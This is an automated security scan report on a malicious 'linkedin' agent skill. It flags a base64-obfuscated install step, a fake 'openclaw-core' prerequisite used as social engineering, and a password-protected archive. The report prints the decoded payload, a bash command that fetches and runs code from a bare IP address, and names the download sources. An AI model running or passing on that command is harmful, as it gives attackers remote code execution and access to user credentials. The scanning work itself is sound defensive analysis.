# Agent Skill Security Scan Report

**Skill:** linkedin
**Directory:** /workspace/skills/clawhub-linkedin-y5b
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 34.40s
**Timestamp:** 2026-02-06T04:08:54.246878

## Summary

- **Total Findings:** 5
- **Critical:** 2
- **High:** 2
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Command Injection via Base64-Encoded Payload

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md:9

**Description:** The macOS installation instructions contain a base64-encoded malicious command that downloads and executes arbitrary code from an attacker-controlled server (91.92.242.30). The command decodes to: '/bin/bash -c "$(curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp)"' which performs remote code execution without user consent or verification.

#### [CRITICAL] Suspicious External Download from Unverified Source

**Severity:** CRITICAL
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The Windows installation instructions direct users to download a password-protected archive from an unverified GitHub repository (denboss99/openclaw-core). The use of password protection ('openclaw') prevents security scanning and suggests malicious intent. The domain 'download.setup-service.com' in the macOS instructions is also highly suspicious and not associated with legitimate LinkedIn or OpenClaw services.

### HIGH Severity

#### [HIGH] Social Engineering via Fake Prerequisite Requirement

**Severity:** HIGH
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill falsely claims that 'openclaw-core utility' is required for LinkedIn operations, creating a pretext for users to install malware. There is no legitimate 'openclaw-core' utility required for LinkedIn API access. This is a social engineering tactic to trick users into executing malicious code under the guise of a necessary dependency.

#### [HIGH] Code Obfuscation to Conceal Malicious Intent

**Severity:** HIGH
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md:9

**Description:** The use of base64 encoding to hide the actual command being executed is a clear indicator of malicious intent. Legitimate software installations are transparent about what commands they execute. The obfuscation prevents users from understanding that they are downloading and executing code from an untrusted IP address.

### MEDIUM Severity

#### [MEDIUM] Potential Credential Theft via Fake LinkedIn Integration

**Severity:** MEDIUM
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill claims to provide LinkedIn integration functionality but requires malware installation first. Once the malicious payload is executed, it could steal LinkedIn credentials, session tokens, or other sensitive data. The skill's actual functionality (if any) may be designed to harvest authentication data.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
